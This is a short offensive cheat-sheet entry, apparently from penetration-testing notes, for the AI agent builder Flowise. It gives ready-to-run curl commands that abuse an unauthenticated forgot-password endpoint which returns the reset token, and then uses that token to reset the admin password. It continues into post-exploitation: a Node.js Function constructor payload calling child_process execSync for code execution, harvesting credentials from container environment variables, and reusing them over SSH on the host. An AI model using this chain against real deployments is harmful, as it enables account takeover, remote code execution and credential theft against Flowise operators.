# Flowise Password Reset Token in API Response

Flowise (AI agent builder) unauthenticated `/api/v1/forgot-password` endpoint returns the reset token directly in the JSON response body instead of sending it by email.

```bash
curl -X POST http://<TARGET>/api/v1/forgot-password \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@example.com"}'
# Response: {"resetToken":"<token>","message":"..."}

# Use token to set new password:
curl -X POST http://<TARGET>/api/v1/reset-password \
  -H 'Content-Type: application/json' \
  -d '{"token":"<token>","newPassword":"<newpass>"}'
```

After admin access, check for:
- JavaScript Function nodes in flow definitions — user-supplied code runs in Node.js via the `Function` constructor
- Equivalent to `eval()`: `new Function('return process.mainModule.require("child_process").execSync("id").toString()')`
- Inside a Docker container: check env vars for credentials, reuse on host SSH
